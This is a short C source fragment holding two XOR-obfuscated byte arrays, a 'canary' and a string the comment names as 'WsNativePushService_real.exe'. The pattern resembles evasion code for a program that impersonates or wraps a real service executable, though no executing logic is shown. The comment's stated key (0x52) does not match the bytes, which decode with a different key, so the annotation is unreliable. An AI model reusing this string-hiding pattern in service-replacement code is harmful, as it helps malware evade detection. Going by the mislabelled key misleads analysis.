...
static const unsigned char xCanary[] = {
    0xD5, 0xFE, 0xB6, 0xC3, 0xF9, 0xF2, 0xF6, 0xF3,
    0xC3, 0xE5, 0xB6, 0xC2, 0xF3, 0xFF, 0xE4, 0xB6,
    0xE5, 0xC0, 0xF5, 0xBE, 0xF8, 0xF3, 0xF7, 0xFA,
    0xE2, 0xF8, 0xA4, 0xFA, 0xF3, 0xF1
};
#define xCanary_LEN 30

/* "WsNativePushService_real.exe" XOR 0x52 */
static const unsigned char xRealExe[] = {
    0xC1, 0xE5, 0xD8, 0xF7, 0xE2, 0xF9, 0xC0, 0xF3,
    0xC6, 0xE3, 0xE5, 0xF8, 0xC5, 0xF3, 0xE4, 0xC0,
    0xF9, 0xF5, 0xF3, 0xBE, 0xE4, 0xF3, 0xF7, 0xFA,
    0xA4, 0xF3, 0xCE, 0xF3
};
